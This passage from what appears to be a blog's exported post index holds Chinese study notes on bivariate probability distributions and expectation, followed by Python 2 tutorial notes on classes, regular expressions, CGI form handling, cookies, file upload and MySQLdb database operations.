vector) 二维随机变量的分布函数： 联合分布函数： 设(X,Y)是二维随机变量，对于任意实数x，y，二元函数: F(x,y)=P{(X≤x)∪(Y≤y)}=P{X≤x,Y≤y} 称为二维随机变量(X,Y)的联合分布函数(Joint probability distribution) 性质： 1. F(x,y)是对于x和y的不减函数，即 x1&lt;x2 =&gt; F(x1,y)&lt;=F(x2,y) y1&lt;y2 =? F(x,y1)&lt;=F(x,y2) 2. 0≤F(x,y)≤1，且对于任意固定的y，F(-∞，y)=0;对于任意固定的x，F(x，-∞)=0 F(-∞，-∞)=0，F(∞，∞)=1 3. F(x，y)关于x右连续，关于y右连续，即 lim ℇ-&gt;0+ F(x+ℇ, y)=F(x, y) lim ℇ-&gt;0+ F(x, y+ℇ)=F(x, y) 4. 对于任意(x1,y1),(x2,y2),x1&lt;x2,y1&lt;y2,下述不等式成立: F(x2,y2)-F(x2,y1)+F(x1,y1)-F(x1,y2)≥0 (积分的时候是上限值-下限值) 离散型的二维随机变量 如果二维随机变量(X,Y)全部可能取到的值是有限对或是可列无限对，则称(X,Y) 为离散型的二维随机变量。 连续型的二维随机变量 如果对于二维随机变量(X,Y)的分布函数F(x,y)，存在非负可积函数f(x，y)使得对 于任意x,y有 F(x,y)=∫x -∞∫y -∞ f(v,v)dudv 称(X,Y)为连续型的二维随机变量。 联合概率密度 性质： 1. f(x,y)≥0 2. ∫∞ -∞ ∫∞ -∞ 𝑓(𝑥,𝑦)𝑑𝑥𝑑𝑦=𝐹(∞,∞) =1 3. 4. 多维随机变量 边缘分布 在多维随机变量中，将X，Y各自的分布称为边缘分布函数 边缘分布律 边缘分布律具有一维分布律的性质 联合分布律唯一决定边缘分布律. 具体求法是将联合分布律写成表格形式, 然后各行分 别相加得关于X的分布律;各列相加得Y的分布律 边缘概率密度 条件分布 条件分布律 条件概率密度 条件分布函数 各种分布的关系 联合分布可以唯一地确定边缘分布和条件分布 随机变量的独立性 //note06 离散型随机变量的数学期望 绝对收敛 随机变量的期望值=均值 二项分布的数学期望 连续型随机变量的数学期望 E(X) = ∫∞ -∞ xf(x)dx //第6周 stat06b 03:00]]></content>
      <categories>
        <category>技能</category>
        <category>数学</category>
        <category>统计学</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>分析</tag>
        <tag>统计学</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2Fpython%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[python学习： class Employee: empCount = 0 def __init__(self,name,salary): self.name = name self.salary = salary Employee.empCount += 1 def displayCount(self): print &quot;Total Employee %d&quot; % Employee.empCount self代表类的实例，而非类。是必须有的 t = Employee() t.displayCount() 添加/修改/删除属性： t.age = 7 t.age = 8 del t.age getattr(obj, name[, default]) : 访问对象的属性。 hasattr(obj,name) : 检查是否存在一个属性。 setattr(obj,name,value) : 设置一个属性。如果属性不存在，会创建一个新属性。 delattr(obj, name) : 删除属性。 python内置类属性： __dict__:类的属性（包含一个字典，由类的数据属性组成） __doc__:类的文档字符串 __name__:类名 __module__:类定义所在的模块 __bases__:类的所有父类构成元素 类的继承： class Parent: class Mother: class Child(Parent,Mother): (可以继承多个类) 类的属性/方法私有： class JustCounter: __secretCount = 0 # 私有,实例化后不能访问私有变量 publicCount = 0 # 公开 __foo__: 定义的是特殊方法，一般是系统定义名字 ，类似 __init__() 之类的。 _foo: 以单下划线开头的表示的是 protected 类型的变量，即保护类型只能允许其本身与子类进行访问，不能用于 from module import * __foo: 双下划线的表示的是私有类型(private)的变量, 只能是允许这个类本身进行访问了。 python正则表达式： re模块 import re print(re.match(&apos;www&apos;, &apos;www.runoob.com&apos;).span()) # 在起始位置匹配 print(re.match(&apos;com&apos;, &apos;www.runoob.com&apos;)) # 不在起始位置匹配 reg： #!/usr/bin/python import re line = &quot;Cats are smarter than dogs&quot; matchObj = re.match( r&apos;(.*) are (.*?) .*&apos;, line, re.M|re.I) if matchObj: print &quot;matchObj.group() : &quot;, matchObj.group() print &quot;matchObj.group(1) : &quot;, matchObj.group(1) print &quot;matchObj.group(2) : &quot;, matchObj.group(2) else: print &quot;No match!!&quot; 以上实例执行结果如下： matchObj.group() : Cats are smarter than dogs matchObj.group(1) : Cats matchObj.group(2) : smarter re.search: import re print(re.search(&apos;www&apos;, &apos;www.runoob.com&apos;).span()) # 在起始位置匹配 print(re.search(&apos;com&apos;, &apos;www.runoob.com&apos;).span()) # 不在起始位置匹配 re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 import re phone = &quot;2004-959-559 # 这是一个国外电话号码&quot; # 删除字符串中的 Python注释 num = re.sub(r&apos;#.*$&apos;, &quot;&quot;, phone) print &quot;电话号码是: &quot;, num # 删除非数字(-)的字符串 num = re.sub(r&apos;\D&apos;, &quot;&quot;, phone) print &quot;电话号码是 : &quot;, num pattern : 一个字符串形式的正则表达式 flags : 可选，表示匹配模式，比如忽略大小写，多行模式等，具体参数为： re.I 忽略大小写 re.L 表示特殊字符集 \w, \W, \b, \B, \s, \S 依赖于当前环境 re.M 多行模式 re.S 即为 . 并且包括换行符在内的任意字符（. 不包括换行符） re.U 表示特殊字符集 \w, \W, \b, \B, \d, \D, \s, \S 依赖于 Unicode 字符属性数据库 re.X 为了增加可读性，忽略空格和 # 后面的注释 &gt;&gt;&gt;import re &gt;&gt;&gt; pattern = re.compile(r&apos;\d+&apos;) # 用于匹配至少一个数字 &gt;&gt;&gt; m = pattern.match(&apos;one12twothree34four&apos;) # 查找头部，没有匹配 &gt;&gt;&gt; print m None &gt;&gt;&gt; m = pattern.match(&apos;one12twothree34four&apos;, 2, 10) # 从&apos;e&apos;的位置开始匹配，没有匹配 &gt;&gt;&gt; print m None &gt;&gt;&gt; m = pattern.match(&apos;one12twothree34four&apos;, 3, 10) # 从&apos;1&apos;的位置开始匹配，正好匹配 &gt;&gt;&gt; print m # 返回一个 Match 对象 &lt;_sre.SRE_Match object at 0x10a42aac0&gt; &gt;&gt;&gt; m.group(0) # 可省略 0 &apos;12&apos; &gt;&gt;&gt; m.start(0) # 可省略 0 3 &gt;&gt;&gt; m.end(0) # 可省略 0 5 &gt;&gt;&gt; m.span(0) # 可省略 0 (3, 5) group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)； start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0； end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0； span([group]) 方法返回 (start(group), end(group))。 &gt;&gt;&gt;import re &gt;&gt;&gt; pattern = re.compile(r&apos;([a-z]+) ([a-z]+)&apos;, re.I) # re.I 表示忽略大小写 &gt;&gt;&gt; m = pattern.match(&apos;Hello World Wide Web&apos;) &gt;&gt;&gt; print m # 匹配成功，返回一个 Match 对象 &lt;_sre.SRE_Match object at 0x10bea83e8&gt; &gt;&gt;&gt; m.group(0) # 返回匹配成功的整个子串 &apos;Hello World&apos; &gt;&gt;&gt; m.span(0) # 返回匹配成功的整个子串的索引 (0, 11) &gt;&gt;&gt; m.group(1) # 返回第一个分组匹配成功的子串 &apos;Hello&apos; &gt;&gt;&gt; m.span(1) # 返回第一个分组匹配成功的子串的索引 (0, 5) &gt;&gt;&gt; m.group(2) # 返回第二个分组匹配成功的子串 &apos;World&apos; &gt;&gt;&gt; m.span(2) # 返回第二个分组匹配成功的子串 (6, 11) &gt;&gt;&gt; m.groups() # 等价于 (m.group(1), m.group(2), ...) (&apos;Hello&apos;, &apos;World&apos;) &gt;&gt;&gt; m.group(3) # 不存在第三个分组 Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; IndexError: no such group findall 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。 string : 待匹配的字符串。 pos : 可选参数，指定字符串的起始位置，默认为 0。 endpos : 可选参数，指定字符串的结束位置，默认为字符串的长度。 # -*- coding:UTF8 -*- import re pattern = re.compile(r&apos;\d+&apos;) # 查找数字 result1 = pattern.findall(&apos;runoob 123 google 456&apos;) result2 = pattern.findall(&apos;run88oob123google456&apos;, 0, 10) print(result1) print(result2) 输出结果： [&apos;123&apos;, &apos;456&apos;] [&apos;88&apos;, &apos;12&apos;] re.finditer 和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。 # -*- coding: UTF-8 -*- import re it = re.finditer(r&quot;\d+&quot;,&quot;12a32bc43jf3&quot;) for match in it: print (match.group() ) 输出结果： 12 32 43 3 re.split split 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下： maxsplit 分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。 &gt;&gt;&gt;import re &gt;&gt;&gt; re.split(&apos;\W+&apos;, &apos;runoob, runoob, runoob.&apos;) [&apos;runoob&apos;, &apos;runoob&apos;, &apos;runoob&apos;, &apos;&apos;] &gt;&gt;&gt; re.split(&apos;(\W+)&apos;, &apos; runoob, runoob, runoob.&apos;) [&apos;&apos;, &apos; &apos;, &apos;runoob&apos;, &apos;, &apos;, &apos;runoob&apos;, &apos;, &apos;, &apos;runoob&apos;, &apos;.&apos;, &apos;&apos;] &gt;&gt;&gt; re.split(&apos;\W+&apos;, &apos; runoob, runoob, runoob.&apos;, 1) [&apos;&apos;, &apos;runoob, runoob, runoob.&apos;] &gt;&gt;&gt; re.split(&apos;a*&apos;, &apos;hello world&apos;) # 对于一个找不到匹配的字符串而言，split 不会对其作出分割 [&apos;hello world&apos;] python CGI编程： CGI(Common Gateway Interface),通用网关接口,它是一段程序,运行在服务器上如：HTTP服务器，提供同客户端HTML页面的接口 Web服务器支持及配置 在你进行CGI编程前，确保您的Web服务器支持CGI及已经配置了CGI的处理程序。 Apache 支持CGI 配置： 设置好CGI目录： ScriptAlias /cgi-bin/ /var/www/cgi-bin/ 所有的HTTP服务器执行CGI程序都保存在一个预先配置的目录。这个目录被称为CGI目录，并按照惯例，它被命名为/var/www/cgi-bin目录。 CGI文件的扩展名为.cgi，python也可以使用.py扩展名。 如果你想指定其他运行 CGI 脚本的目录，可以修改 httpd.conf 配置文件，如下所示： &lt;Directory &quot;/var/www/cgi-bin&quot;&gt; AllowOverride None Options +ExecCGI Order allow,deny Allow from all &lt;/Directory&gt; 在 AddHandler 中添加 .py 后缀，这样我们就可以访问 .py 结尾的 python 脚本文件： AddHandler cgi-script .cgi .pl .py 第一个CGI程序 我们使用Python创建第一个CGI程序，文件名为hello.py，文件位于/var/www/cgi-bin目录中，内容如下： #!/usr/bin/python # -*- coding: UTF-8 -*- print &quot;Content-type:text/html&quot; print # 空行，告诉服务器结束头部 print &apos;&lt;html&gt;&apos; print &apos;&lt;head&gt;&apos; print &apos;&lt;meta charset=&quot;utf-8&quot;&gt;&apos; print &apos;&lt;title&gt;Hello World - 我的第一个 CGI 程序！&lt;/title&gt;&apos; print &apos;&lt;/head&gt;&apos; print &apos;&lt;body&gt;&apos; print &apos;&lt;h2&gt;Hello World! 我是来自菜鸟教程的第一CGI程序&lt;/h2&gt;&apos; print &apos;&lt;/body&gt;&apos; print &apos;&lt;/html&gt;&apos; 文件保存后修改 hello.py，修改文件权限为 755 在浏览器访问 http://localhost/cgi-bin/hello.py 以下表格介绍了CGI程序中HTTP头部经常使用的信息： 头 描述 Content-type: 请求的与实体对应的MIME信息。例如: Content-type:text/html Expires: Date 响应过期的日期和时间 Location: URL 用来重定向接收方到非请求URL的位置来完成请求或标识新的资源 Last-modified: Date 请求资源的最后修改时间 Content-length: N 请求的内容长度 Set-Cookie: String 设置Http Cookie 以下是一个简单的CGI脚本输出CGI的环境变量： #!/usr/bin/python # -*- coding: UTF-8 -*- # filename:test.py import os print &quot;Content-type: text/html&quot; print print &quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot; print &quot;&lt;b&gt;环境变量&lt;/b&gt;&lt;br&gt;&quot;; print &quot;&lt;ul&gt;&quot; for key in os.environ.keys(): print &quot;&lt;li&gt;&lt;span style=&apos;color:green&apos;&gt;%30s &lt;/span&gt; : %s &lt;/li&gt;&quot; % (key,os.environ[key]) print &quot;&lt;/ul&gt;&quot; GET方法发送编码后的用户信息到服务端，数据信息包含在请求页面的URL上，以&quot;?&quot;号分割, 如下所示： http://www.test.com/cgi-bin/hello.py?key1=value1&amp;key2=value2 GET 请求可被缓存 GET 请求保留在浏览器历史记录中 GET 请求可被收藏为书签 GET 请求不应在处理敏感数据时使用 GET 请求有长度限制 GET 请求只应当用于取回数据 以下为hello_get.py文件的代码： #!/usr/bin/python # -*- coding: UTF-8 -*- # filename：test.py # CGI处理模块 import cgi, cgitb # 创建 FieldStorage 的实例化 form = cgi.FieldStorage() # 获取数据 site_name = form.getvalue(&apos;name&apos;) site_url = form.getvalue(&apos;url&apos;) print &quot;Content-type:text/html&quot; print print &quot;&lt;html&gt;&quot; print &quot;&lt;head&gt;&quot; print &quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot; print &quot;&lt;title&gt;菜鸟教程 CGI 测试实例&lt;/title&gt;&quot; print &quot;&lt;/head&gt;&quot; print &quot;&lt;body&gt;&quot; print &quot;&lt;h2&gt;%s官网：%s&lt;/h2&gt;&quot; % (site_name, site_url) print &quot;&lt;/body&gt;&quot; print &quot;&lt;/html&gt;&quot; localhost/cgi-bin/hello_get.py?name=xxx&amp;url=http://www.xxx.com &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/cgi-bin/hello_get.py&quot; method=&quot;get&quot;&gt; 站点名称: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; &lt;br /&gt; 站点 URL: &lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; chmod 755 hello_get.html get/post py传递写法一样 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/cgi-bin/hello_get.py&quot; method=&quot;post&quot;&gt; 站点名称: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; &lt;br /&gt; 站点 URL: &lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 通过CGI程序传递checkbox数据 checkbox用于提交一个或者多个选项数据，HTML代码如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/cgi-bin/checkbox.py&quot; method=&quot;POST&quot; target=&quot;_blank&quot;&gt; &lt;input type=&quot;checkbox&quot; name=&quot;runoob&quot; value=&quot;on&quot; /&gt; 菜鸟教程 &lt;input type=&quot;checkbox&quot; name=&quot;google&quot; value=&quot;on&quot; /&gt; Google &lt;input type=&quot;submit&quot; value=&quot;选择站点&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; #!/usr/bin/python # -*- coding: UTF-8 -*- # 引入 CGI 处理模块 import cgi, cgitb # 创建 FieldStorage的实例 form = cgi.FieldStorage() # 接收字段数据 if form.getvalue(&apos;google&apos;): google_flag = &quot;是&quot; else: google_flag = &quot;否&quot; if form.getvalue(&apos;runoob&apos;): runoob_flag = &quot;是&quot; else: runoob_flag = &quot;否&quot; print &quot;Content-type:text/html&quot; print print &quot;&lt;html&gt;&quot; print &quot;&lt;head&gt;&quot; print &quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot; print &quot;&lt;title&gt;菜鸟教程 CGI 测试实例&lt;/title&gt;&quot; print &quot;&lt;/head&gt;&quot; print &quot;&lt;body&gt;&quot; print &quot;&lt;h2&gt; 菜鸟教程是否选择了 : %s&lt;/h2&gt;&quot; % runoob_flag print &quot;&lt;h2&gt; Google 是否选择了 : %s&lt;/h2&gt;&quot; % google_flag print &quot;&lt;/body&gt;&quot; print &quot;&lt;/html&gt;&quot; 通过CGI程序传递Radio数据 Radio 只向服务器传递一个数据，HTML代码如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/cgi-bin/radiobutton.py&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt; &lt;input type=&quot;radio&quot; name=&quot;site&quot; value=&quot;runoob&quot; /&gt; 菜鸟教程 &lt;input type=&quot;radio&quot; name=&quot;site&quot; value=&quot;google&quot; /&gt; Google &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; #!/usr/bin/python # -*- coding: UTF-8 -*- # 引入 CGI 处理模块 import cgi, cgitb # 创建 FieldStorage的实例 form = cgi.FieldStorage() # 接收字段数据 if form.getvalue(&apos;site&apos;): site = form.getvalue(&apos;site&apos;) else: site = &quot;提交数据为空&quot; print &quot;Content-type:text/html&quot; print print &quot;&lt;html&gt;&quot; print &quot;&lt;head&gt;&quot; print &quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot; print &quot;&lt;title&gt;菜鸟教程 CGI 测试实例&lt;/title&gt;&quot; print &quot;&lt;/head&gt;&quot; print &quot;&lt;body&gt;&quot; print &quot;&lt;h2&gt; 选中的网站是 %s&lt;/h2&gt;&quot; % site print &quot;&lt;/body&gt;&quot; print &quot;&lt;/html&gt;&quot; 通过CGI程序传递 Textarea 数据 Textarea 向服务器传递多行数据，HTML代码如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/cgi-bin/textarea.py&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt; &lt;textarea name=&quot;textcontent&quot; cols=&quot;40&quot; rows=&quot;4&quot;&gt; 在这里输入内容... &lt;/textarea&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; #!/usr/bin/python # -*- coding: UTF-8 -*- # 引入 CGI 处理模块 import cgi, cgitb # 创建 FieldStorage的实例 form = cgi.FieldStorage() # 接收字段数据 if form.getvalue(&apos;textcontent&apos;): text_content = form.getvalue(&apos;textcontent&apos;) else: text_content = &quot;没有内容&quot; print &quot;Content-type:text/html&quot; print print &quot;&lt;html&gt;&quot; print &quot;&lt;head&gt;&quot;; print &quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot; print &quot;&lt;title&gt;菜鸟教程 CGI 测试实例&lt;/title&gt;&quot; print &quot;&lt;/head&gt;&quot; print &quot;&lt;body&gt;&quot; print &quot;&lt;h2&gt; 输入的内容是：%s&lt;/h2&gt;&quot; % text_content print &quot;&lt;/body&gt;&quot; print &quot;&lt;/html&gt;&quot; 通过CGI程序传递下拉数据。 HTML 下拉框代码如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/cgi-bin/dropdown.py&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt; &lt;select name=&quot;dropdown&quot;&gt; &lt;option value=&quot;runoob&quot; selected&gt;菜鸟教程&lt;/option&gt; &lt;option value=&quot;google&quot;&gt;Google&lt;/option&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; #!/usr/bin/python # -*- coding: UTF-8 -*- # 引入 CGI 处理模块 import cgi, cgitb # 创建 FieldStorage的实例 form = cgi.FieldStorage() # 接收字段数据 if form.getvalue(&apos;dropdown&apos;): dropdown_value = form.getvalue(&apos;dropdown&apos;) else: dropdown_value = &quot;没有内容&quot; print &quot;Content-type:text/html&quot; print print &quot;&lt;html&gt;&quot; print &quot;&lt;head&gt;&quot; print &quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot; print &quot;&lt;title&gt;菜鸟教程 CGI 测试实例&lt;/title&gt;&quot; print &quot;&lt;/head&gt;&quot; print &quot;&lt;body&gt;&quot; print &quot;&lt;h2&gt; 选中的选项是：%s&lt;/h2&gt;&quot; % dropdown_value print &quot;&lt;/body&gt;&quot; print &quot;&lt;/html&gt;&quot; cookie的语法 http cookie的发送是通过http头部来实现的，他早于文件的传递，头部set-cookie的语法如下： Set-cookie:name=name;expires=date;path=path;domain=domain;secure name=name: 需要设置cookie的值(name不能使用&quot;;&quot;和&quot;,&quot;号),有多个name值时用 &quot;;&quot; 分隔，例如：name1=name1;name2=name2;name3=name3。 expires=date: cookie的有效期限,格式： expires=&quot;Wdy,DD-Mon-YYYY HH:MM:SS&quot; path=path: 设置cookie支持的路径,如果path是一个路径，则cookie对这个目录下的所有文件及子目录生效，例如： path=&quot;/cgi-bin/&quot;，如果path是一个文件，则cookie指对这个文件生效，例如：path=&quot;/cgi-bin/cookie.cgi&quot;。 domain=domain: 对cookie生效的域名，例如：domain=&quot;www.runoob.com&quot; secure: 如果给出此标志，表示cookie只能通过SSL协议的https服务器来传递。 cookie的接收是通过设置环境变量HTTP_COOKIE来实现的，CGI程序可以通过检索该变量获取cookie信息。 #!/usr/bin/python # -*- coding: UTF-8 -*- # print &apos;Content-Type: text/html&apos; print &apos;Set-Cookie: name=&quot;菜鸟教程&quot;;expires=Wed, 28 Aug 2016 18:30:00 GMT&apos; print print &quot;&quot;&quot; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Cookie set OK!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; &quot;&quot;&quot; 以下是一个简单的CGI检索cookie信息的程序： #!/usr/bin/python # -*- coding: UTF-8 -*- # 导入模块 import os import Cookie print &quot;Content-type: text/html&quot; print print &quot;&quot;&quot; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;读取cookie信息&lt;/h1&gt; &quot;&quot;&quot; if &apos;HTTP_COOKIE&apos; in os.environ: cookie_string=os.environ.get(&apos;HTTP_COOKIE&apos;) c=Cookie.SimpleCookie() c.load(cookie_string) try: data=c[&apos;name&apos;].value print &quot;cookie data: &quot;+data+&quot;&lt;br&gt;&quot; except KeyError: print &quot;cookie 没有设置或者已过去&lt;br&gt;&quot; print &quot;&quot;&quot; &lt;/body&gt; &lt;/html&gt; &quot;&quot;&quot; 文件上传实例 HTML设置上传文件的表单需要设置 enctype 属性为 multipart/form-data，代码如下所示： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;/cgi-bin/save_file.py&quot; method=&quot;post&quot;&gt; &lt;p&gt;选中文件: &lt;input type=&quot;file&quot; name=&quot;filename&quot; /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;上传&quot; /&gt;&lt;/p&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; #!/usr/bin/python # -*- coding: UTF-8 -*- import cgi, os import cgitb; cgitb.enable() form = cgi.FieldStorage() # 获取文件名 fileitem = form[&apos;filename&apos;] # 检测文件是否上传 if fileitem.filename: # 设置文件路径 # 如果你使用的系统是Unix/Linux，你必须替换文件分隔符，在window下只需要使用open()语句即可： # fn = os.path.basename(fileitem.filename.replace(&quot;\\&quot;, &quot;/&quot; )) fn = os.path.basename(fileitem.filename) open(&apos;/tmp/&apos; + fn, &apos;wb&apos;).write(fileitem.file.read()) message = &apos;文件 &quot;&apos; + fn + &apos;&quot; 上传成功&apos; else: message = &apos;文件没有上传&apos; print &quot;&quot;&quot;\ Content-Type: text/html\n &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;%s&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; &quot;&quot;&quot; % (message,) 文件下载对话框 #!/usr/bin/python # -*- coding: UTF-8 -*- # HTTP 头部 print &quot;Content-Disposition: attachment; filename=\&quot;foo.txt\&quot;&quot;; print # 打开文件 fo = open(&quot;foo.txt&quot;, &quot;rb&quot;) str = fo.read(); print str # 关闭文件 fo.close() python MYSQL MySQLdb 是用于Python链接Mysql数据库的接口 安装MySQLdb，请访问 http://sourceforge.net/projects/mysql-python ，(Linux平台可以访问：https://pypi.python.org/pypi/MySQL-python)从这里可选择适合您的平台的安装包，分为预编译的二进制文件和源代码安装包。 如果您选择二进制文件发行版本的话，安装过程基本安装提示即可完成。如果从源代码进行安装的话，则需要切换到MySQLdb发行版本的顶级目录，并键入下列命令: $ gunzip MySQL-python-1.2.2.tar.gz $ tar -xvf MySQL-python-1.2.2.tar $ cd MySQL-python-1.2.2 $ python setup.py build $ python setup.py install #!/usr/bin/python # -*- coding: UTF-8 -*- import MySQLdb # 打开数据库连接 db = MySQLdb.connect(&quot;localhost&quot;, &quot;testuser&quot;, &quot;test123&quot;, &quot;TESTDB&quot;, charset=&apos;utf8&apos; ) # 使用cursor()方法获取操作游标 cursor = db.cursor() # 使用execute方法执行SQL语句 cursor.execute(&quot;SELECT VERSION()&quot;) # 使用 fetchone() 方法获取一条数据 data = cursor.fetchone() print &quot;Database version : %s &quot; % data # 关闭数据库连接 db.close() 创建数据库表 如果数据库连接存在我们可以使用execute()方法来为数据库创建表，如下所示创建表EMPLOYEE： #!/usr/bin/python # -*- coding: UTF-8 -*- import MySQLdb # 打开数据库连接 db = MySQLdb.connect(&quot;localhost&quot;, &quot;testuser&quot;, &quot;test123&quot;, &quot;TESTDB&quot;, charset=&apos;utf8&apos; ) # 使用cursor()方法获取操作游标 cursor = db.cursor() # 如果数据表已经存在使用 execute() 方法删除表。 cursor.execute(&quot;DROP TABLE IF EXISTS EMPLOYEE&quot;) # 创建数据表SQL语句 sql = &quot;&quot;&quot;CREATE TABLE EMPLOYEE ( FIRST_NAME CHAR(20) NOT NULL, LAST_NAME CHAR(20), AGE INT, SEX CHAR(1), INCOME FLOAT )&quot;&quot;&quot; cursor.execute(sql) # 关闭数据库连接 db.close() 数据库插入操作 以下实例使用执行 SQL INSERT 语句向表 EMPLOYEE 插入记录： #!/usr/bin/python # -*- coding: UTF-8 -*- import MySQLdb # 打开数据库连接 db = MySQLdb.connect(&quot;localhost&quot;, &quot;testuser&quot;, &quot;test123&quot;, &quot;TESTDB&quot;, charset=&apos;utf8&apos; ) # 使用cursor()方法获取操作游标 cursor = db.cursor() # SQL 插入语句 # sql = &quot;INSERT INTO EMPLOYEE(FIRST_NAME, \ LAST_NAME, AGE, SEX, INCOME) \ VALUES (&apos;%s&apos;, &apos;%s&apos;, &apos;%d&apos;, &apos;%c&apos;, &apos;%d&apos; )&quot; % \ (&apos;Mac&apos;, &apos;Mohan&apos;, 20, &apos;M&apos;, 2000) sql = &quot;&quot;&quot;INSERT INTO EMPLOYEE(FIRST_NAME, LAST_NAME, AGE, SEX, INCOME) VALUES (&apos;Mac&apos;, &apos;Mohan&apos;, 20, &apos;M&apos;, 2000)&quot;&quot;&quot; try: # 执行sql语句 cursor.execute(sql) # 提交到数据库执行 db.commit() except: # Rollback in case there is any error db.rollback() # 关闭数据库连接 db.close() 数据库查询操作 fetchone(): 该方法获取下一个查询结果集。结果集是一个对象 fetchall():接收全部的返回结果行. rowcount: 这是一个只读属性，并返回执行execute()方法后影响的行数。 数据库更新操作 #!/usr/bin/python # -*- coding: UTF-8 -*- import MySQLdb # 打开数据库连接 db = MySQLdb.connect(&quot;localhost&quot;, &quot;testuser&quot;, &quot;test123&quot;, &quot;TESTDB&quot;, charset=&apos;utf8&apos; ) # 使用cursor()方法获取操作游标 cursor = db.cursor() # SQL 更新语句 sql = &quot;UPDATE EMPLOYEE SET AGE = AGE + 1 WHERE SEX = &apos;%c&apos;&quot; % (&apos;M&apos;) try: # 执行SQL语句 cursor.execute(sql) # 提交到数据库执行 db.commit() except: # 发生错误时回滚 db.rollback() # 关闭数据库连接 db.close() 删除操作 #!/usr/bin/python # -*- coding: UTF-8 -*- import MySQLdb # 打开数据库连接 db = MySQLdb.connect(&quot;localhost&quot;, &quot;testuser&quot;, &quot;test123&quot;, &quot;TESTDB&quot;, charset=&apos;utf8&apos; ) # 使用cursor()方法获取操作游标 cursor = db.cursor() # SQL 删除语句 sql = &quot;DELETE FROM EMPLOYEE WHERE AGE &gt; &apos;%d&apos;&quot; % (20) try: # 执行SQL语句 